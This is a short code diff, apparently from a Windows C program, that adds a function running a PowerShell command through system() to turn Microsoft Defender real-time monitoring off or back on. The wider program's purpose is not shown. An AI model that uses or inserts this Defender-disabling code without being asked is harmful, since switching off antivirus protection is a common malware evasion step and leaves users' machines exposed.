@@ -273,3 +273,24 @@ BOOL WINAPI CtrlHandler(DWORD ControlType) {
         return FALSE;
     }
 }
+
+
+RETURN_LAST RealTime(BOOL IsDisable) {
+    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
+    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
+    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\"";
+    if (IsDisable) {
+        LastError.LastError = system(Disable);
+    }
+    else {
+        LastError.LastError = system(Enable);
+    }
+
+    if (LastError.LastError == -1) {
+        LastError.LastError = GetLastError();
+        LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
+        return LastError;
+    }
+    LastError.LastError = 0;
+    return LastError;
+}
